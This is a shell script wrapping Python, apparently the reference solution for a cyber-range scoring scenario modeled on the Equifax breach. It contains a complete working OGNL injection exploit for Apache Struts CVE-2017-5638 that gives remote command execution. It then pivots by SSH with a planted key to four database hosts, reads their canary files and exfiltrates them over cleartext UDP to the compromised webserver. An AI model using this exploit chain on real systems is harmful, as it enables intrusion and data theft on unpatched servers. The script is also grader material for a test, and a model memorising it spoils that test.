#!/bin/bash
# Reference: the Equifax-shaped chain, exercised for real from the attacker.
# CVE-2017-5638 (the Content-Type OGNL injection against the struts2-showcase
# on webserver_0) yields execution as tomcat; tomcat's planted pivot key
# reaches every database user; each canary is read AND beaconed in cleartext
# UDP from the DATABASE across the critical segment (source-bound pcap
# corroboration), then volume is pushed across the segment so the beacons
# land in a harvested capture chunk. Must score 1.0, every goal corroborated.
# The OGNL payload also lives in recipes/mh.webserver/payload/struts_probe.sh
# and the sibling check scripts; change one, keep the others in step.
set -euo pipefail
python3 - <<'PY'
from __future__ import annotations

import http.client
import re
import shlex
import socket
import time
import urllib.request

WEB = "192.168.200.10"
SSH_OPTS = (
    "-i /opt/tomcat/.ssh/id_ed25519 -o StrictHostKeyChecking=no "
    "-o UserKnownHostsFile=/dev/null -o ConnectTimeout=10"
)

PAYLOAD = (
    "%{(#_='multipart/form-data')."
    "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    "(#_memberAccess?(#_memberAccess=#dm):"
    "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    "(#ognlUtil.getExcludedPackageNames().clear())."
    "(#ognlUtil.getExcludedClasses().clear())."
    "(#context.setMemberAccess(#dm))))."
    "(#cmd=CMDGOESHERE)."
    "(#cmds={'/bin/bash','-c',#cmd})."
    "(#p=new java.lang.ProcessBuilder(#cmds))."
    "(#p.redirectErrorStream(true)).(#process=#p.start())."
    "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    "(#ros.flush())}"
)


def rce(command: str, timeout: int = 120) -> str:
    """Execute `command` on the webserver as tomcat via CVE-2017-5638."""
    ognl_literal = "'" + command.replace("\\", "\\\\").replace("'", "\\'") + "'"
    header = PAYLOAD.replace("CMDGOESHERE", ognl_literal)
    request = urllib.request.Request(
        f"http://{WEB}:8080/struts2-showcase/showcase.action",
        headers={"Content-Type": header},
    )
    response = urllib.request.urlopen(request, timeout=timeout)
    try:
        body = response.read()
    except http.client.IncompleteRead as partial:
        # the exploit writes to the raw output stream, so tomcat's chunked
        # encoding terminates abruptly; the partial body IS the output
        body = partial.partial
    return body.decode(errors="replace")


def wait_surface() -> None:
    deadline = time.time() + 240
    while time.time() < deadline:
        try:
            socket.create_connection((WEB, 8080), timeout=3).close()
            return
        except OSError:
            time.sleep(5)
    raise SystemExit("the webserver's struts surface never converged")


wait_surface()
whoami = rce("id")
if "tomcat" not in whoami:
    raise SystemExit(f"the struts RCE did not land as tomcat: {whoami[:200]}")
print(f"struts RCE live: {whoami.strip()[:80]}")

for n in range(4):
    ip = f"192.168.201.5{n}"
    user = f"database{n}"
    path = f"/home/{user}/data_database_{n}.json"
    remote = (
        f"cat {path}; "
        f"bash -c 'cat {path} > /dev/udp/{WEB}/41414' || true"
    )
    out = rce(f"ssh {SSH_OPTS} {user}@{ip} {shlex.quote(remote)}", timeout=120)
    match = re.search(r"[0-9a-f]{32}", out)
    if not match:
        raise SystemExit(f"database_{n} canary not read: {out[-200:]!r}")
    print(f"SUBMIT exfil-database-{n} {match.group(0)}")

# push volume across the critical segment so the beacons land in a HARVESTED
# capture chunk (tcpdump rotates by size; scoring reads rotated chunks)
rce(
    "head -c 2500000 /dev/urandom > /tmp/ir-pad && "
    f"scp {SSH_OPTS} /tmp/ir-pad database0@192.168.201.50:/tmp/ir-pad && "
    "rm -f /tmp/ir-pad",
    timeout=180,
)
PY
